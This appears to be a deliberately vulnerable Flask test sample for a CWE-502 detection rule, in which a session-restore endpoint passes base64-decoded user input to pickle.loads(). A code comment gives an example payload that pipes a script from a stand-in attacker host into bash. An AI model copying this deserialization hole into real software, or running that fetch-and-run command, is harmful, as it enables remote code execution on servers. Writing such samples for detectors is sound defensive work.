# VULNERABLE: PyUnsafeDeserialize — pickle.loads() called with user-controlled data
# Rule: PyUnsafeDeserializeTemplate | CWE-502 | Severity: CRITICAL

import pickle
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route('/api/session/restore', methods=['POST'])
def restore_session():
    """Restore a user session from a serialized payload."""
    data = request.get_json()
    serialized = data.get('session_data', '')

    # <-- VULNERABLE: pickle.loads() on user-supplied data enables arbitrary code execution
    # An attacker can craft a pickle payload that runs any Python code on the server:
    #   import os; os.system('curl attacker.com/shell | bash')
    raw = base64.b64decode(serialized)
    session_obj = pickle.loads(raw)

    return jsonify({
        'user': session_obj.get('user'),
        'role': session_obj.get('role'),
    })


if __name__ == '__main__':
    app.run()
